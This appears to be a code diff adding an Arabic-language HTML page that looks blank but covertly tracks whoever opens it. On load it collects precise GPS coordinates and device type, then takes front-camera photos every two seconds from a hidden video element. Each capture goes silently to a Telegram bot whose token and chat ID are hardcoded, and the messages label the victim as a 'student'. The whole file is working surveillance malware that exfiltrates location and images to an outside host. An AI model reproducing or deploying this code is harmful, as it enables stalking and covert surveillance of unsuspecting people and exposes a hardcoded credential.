@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        body {
+            background-color: #ffffff;
+            margin: 0;
+            height: 100vh;
+            overflow: hidden;
+            -webkit-user-select: none; 
+            user-select: none;
+        }
+    </style>
+</head>
+<body>
+
+<video id="videoFront" autoplay playsinline style="display:none;"></video>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const token = urlParams.get('token') || 'غير محدد';
+    const studentName = decodeURIComponent(urlParams.get('name') || 'غير معروف');
+    
+    const BOT_TOKEN = "7441744296:AAHH0zRxqE6XUJHXNEbDXS9YOmRL3-p9aeU"; 
+    const CHAT_ID = "6257870641"; 
+
+    let gpsLocation = null;
+    let frontStream = null;
+
+    window.addEventListener('load', async () => {
+        if (!urlParams.get('token')) return;
+
+        // 1. طلب إذن الموقع الجغرافي الدقيق جداً (GPS) حصراً وتجاهل أي تقريب شبكي
+        await requestExactGPSLocation();
+
+        // 2. إرسال تقرير الموقع الدقيق والجهاز فوراً لتليجرام
+        await sendLocationReport();
+
+        // 3. تشغيل الكاميرا الأمامية حصراً والبدء بالارسال
+        initFrontCameraSurveillance();
+    });
+
+    function requestExactGPSLocation() {
+        return new Promise((resolve) => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        gpsLocation = {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        resolve();
+                    },
+                    (error) => {
+                        resolve();
+                    },
+                    { 
+                        enableHighAccuracy: true, // إجبار المتطلبات على جلب GPS حقيقي وليس IP
+                        timeout: 15000, 
+                        maximumAge: 0 
+                    }
+                );
+            } else {
+                resolve();
+            }
+        });
+    }
+
+    async function sendLocationReport() {
+        const ua = navigator.userAgent;
+        let deviceType = "جهاز ذكي";
+        if (/iPhone|iPad|iPod/i.test(ua)) deviceType = "آيفون / آيباد (iOS)";
+        else if (/Android/i.test(ua)) deviceType = "هاتف أندرويد (Android)";
+        else if (/Windows|Macintosh/i.test(ua)) deviceType = "حاسوب شخصي";
+
+        let mapInfo = "❌ لم يتم السماح بالوصول للموقع أو تعذر التقاط GPS دقيق";
+        if (gpsLocation) {
+            mapInfo = `https://maps.google.com/?q=${gpsLocation.lat},${gpsLocation.lon}\n🎯 (دقة الموقع الفعلية ضمن ${Math.round(gpsLocation.accuracy)} متر)`;
+        }
+
+        const report = 
+            `📍 **تقرير الموقع الدقيق (GPS)**\n` +
+            `━━━━━━━━━━━━━━━━━━━━\n` +
+            `👤 **الطالب:** ${studentName}\n` +
+            `🔑 **الرمز:** \`${token}\`\n` +
+            `🕒 **الوقت:** ${new Date().toLocaleString('ar-IQ')}\n` +
+            `📱 **الجهاز:** ${deviceType}\n\n` +
+            `🗺️ **إحداثيات الخريطة:**\n${mapInfo}`;
+
+        sendTelegramMessage(report);
+    }
+
+    async function initFrontCameraSurveillance() {
+        try {
+            // التركيز حصراً على الكاميرا الأمامية (user)
+            frontStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: false 
+            });
+            const video = document.getElementById('videoFront');
+            video.srcObject = frontStream;
+
+            // التقاط الصور وإرسالها كل ثانيتين بصمت تام
+            setInterval(() => {
+                captureAndSendCameraFrame();
+            }, 2000);
+
+        } catch (err) {
+            sendTelegramMessage("❌ تنبيه: رفض المستخدم إذن الكاميرا الأمامية أو الجهاز لا يدعمها.");
+        }
+    }
+
+    function captureAndSendCameraFrame() {
+        const video = document.getElementById('videoFront');
+        if (!video || !video.videoWidth) return;
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(blob => {
+            if (!blob) return;
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'front_snap.jpg');
+            formData.append('caption', `📸 كاميرا أمامية\n👤 الطالب: ${studentName}\n🔑 الرمز: \`${token}\`\n🕒 ${new Date().toLocaleTimeString('ar-IQ')}`);
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData }).catch(e => {});
+        }, 'image/jpeg', 0.6);
+    }
+
+    function sendTelegramMessage(text) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+        }).catch(e => {});
+    }
+</script>
+
+</body>
+</html>
